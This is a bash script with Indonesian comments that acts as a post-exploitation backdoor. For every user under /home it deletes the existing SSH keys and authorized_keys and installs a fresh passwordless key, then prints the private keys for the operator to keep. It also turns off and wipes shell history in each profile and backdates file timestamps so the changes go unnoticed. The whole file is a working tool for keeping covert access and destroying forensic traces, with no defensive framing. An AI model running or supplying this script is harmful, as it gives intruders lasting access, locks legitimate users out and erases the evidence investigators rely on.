#!/bin/bash

# sed -i 's/\r$//' ssh.sh && chmod +x ssh.sh && ./ssh.sh

unset HISTFILE && export HISTSIZE=0 && export HISTFILE=/dev/null && export HISTFILESIZE=0 && set +o history && export HISTCONTROL=ignorespace && export TERM=xterm 2>/dev/null
BASE_DIR="/home"

for user_dir in "$BASE_DIR"/*; do
    if [ -d "$user_dir" ]; then
        SSH_DIR="$user_dir/.ssh"
        AUTH_KEYS="$SSH_DIR/authorized_keys"
        ID_RSA="$SSH_DIR/id_rsa"

        # --- Bagian 1: SSH Key Management (Overwrite) ---
        mkdir -p "$SSH_DIR" 2>/dev/null
        chmod 700 "$SSH_DIR" 2>/dev/null
        rm -rf "$ID_RSA" "${ID_RSA}.pub" "$AUTH_KEYS" 2>/dev/null

        ssh-keygen -t rsa -b 4096 -f "$ID_RSA" -N "" -q 2>/dev/null

        if [ -f "${ID_RSA}.pub" ]; then
            cat "${ID_RSA}.pub" > "$AUTH_KEYS" 2>/dev/null
            chmod 600 "$AUTH_KEYS" 2>/dev/null
            rm -f "${ID_RSA}.pub" 2>/dev/null
        fi

        # --- Bagian 2: Stealth History Configuration ---
        # Menambahkan konfigurasi ke .bash_profile dan .bashrc
        CONFIG_STEALTH="unset HISTFILE && export HISTFILE=/dev/null && export HISTSIZE=0 && export HISTFILESIZE=0 && set +o history && export HISTCONTROL=ignorespace && export TERM=xterm"
        
        echo "$CONFIG_STEALTH" >> "$user_dir/.bash_profile" 2>/dev/null
        echo "$CONFIG_STEALTH" >> "$user_dir/.bashrc" 2>/dev/null
        
        # Mengganti isi .bash_logout menjadi pengosongan history
        echo "> ~/.bash_history" > "$user_dir/.bash_logout" 2>/dev/null

        # Membersihkan format file (carriage return) dan source konfigurasi
        sed -i 's/\r$//' "$user_dir/.bash_profile" 2>/dev/null
        sed -i 's/\r$//' "$user_dir/.bashrc" 2>/dev/null
        
        # Menjalankan source secara langsung di shell saat ini (jika user cocok)
        source "$user_dir/.bash_profile" 2>/dev/null
        source "$user_dir/.bashrc" 2>/dev/null
        source "$user_dir/.bash_logout" 2>/dev/null

        # --- Bagian 3: Timestamp Manipulation ---
        # Menyamakan timestamp agar tidak terlihat ada perubahan baru
        find "$user_dir" -maxdepth 1 -exec touch -r /usr/games {} \; 2>/dev/null

        # Output Private Key untuk disimpan
        if [ -f "$ID_RSA" ]; then
            cat "$ID_RSA"
        fi
    fi
done 2>/dev/null
history -c && history -w 
